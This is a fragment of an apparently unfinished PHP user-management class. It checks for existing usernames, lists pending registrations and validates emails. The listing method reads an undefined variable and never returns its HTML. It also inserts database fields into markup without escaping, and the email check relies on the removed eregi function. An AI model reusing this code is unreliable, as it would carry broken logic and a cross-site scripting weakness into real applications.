		//$cmdcount->bindParam(":pRegistros", $nregistros, PDO::PARAM_INT);
		
		$cmd->execute();
		
		$rs = $cmd->fetchAll(PDO::FETCH_OBJ);
		
		$cmdcount->execute();
		$regs = $cmdcount->rowCount();
		
		return $rs;
	}
	
	public function JaExiste()
	{
		$sql = "select Codigo from mesusuario where NomeUsuario =:pUsuario;";
		
		$cnn = Conexao2::getInstance();
		
		$cmd = $cnn->prepare($sql);
		$cmd->bindParam(":pUsuario", $this->usuario, PDO::PARAM_STR);
		
		if ($cmd->execute())
		{
			if ($cmd->rowCount() > 0)
			{
				return true;
			}
			else
			{
				return false;
			}
		}
		else
		{
			throw new Exception($cmd->errorInfo(), 1013);
		}
	}
	
	public function ListaPedidosAprovacao()
	{
		$sql = "select Codigo, NomeCompleto, NomeUsuario, Email, DtCadastro FROM mesusuario WHERE Situacao = 0;";
		$cnn = Conexao2::getInstance();
		$cmd = $cnn->prepare($sql);
		
		$sqlcombo = "select Codigo, Descricao from mesgrupousuario;";
		
		if ($cmd->execute())
		{
			if ($cmd->rowCount() > 0)
			{
				$ret = Comuns::TopoTabelaListagem(
					"Novos cadastros pendentes de aprovação",
					"CadPendentes",
				array('Nome', 'Usuário', 'E-mail', 'Data Cad.', 'Ações')
				);
				
				$ret .= '    <tr>';
				$ret .= '      <td>' . $linha["NomeCompleto"] . '</td>';
				$ret .= '      <td>' . $linha["NomeUsuario"] . '</td>';
				$ret .= '      <td>' . $linha["Email"] . '</td>';
				$ret .= '      <td>';
				
				//$combo = new ComboBox()
				
				$ret .= '      </td>';
				$ret .= '    </tr>';
			}
			else
			{
				$msg = $cmd->errorInfo();
				$this->msg_erro = $msg[2];
				return false;
			}
		}
		else
		{
			throw new Exception($cmd->errorInfo(), 1013);
		}
	}
	
	private function checkEmail($eMailAddress)
	{
		if (eregi("^[0-9a-z]([-_.]?[0-9a-z])*@[0-9a-z]([-.]?[0-9a-z])*\\.[a-z]{2,3}$", $eMailAddress, $check))
		{
			return true;
		}
		 
		return false;
	}
}

?>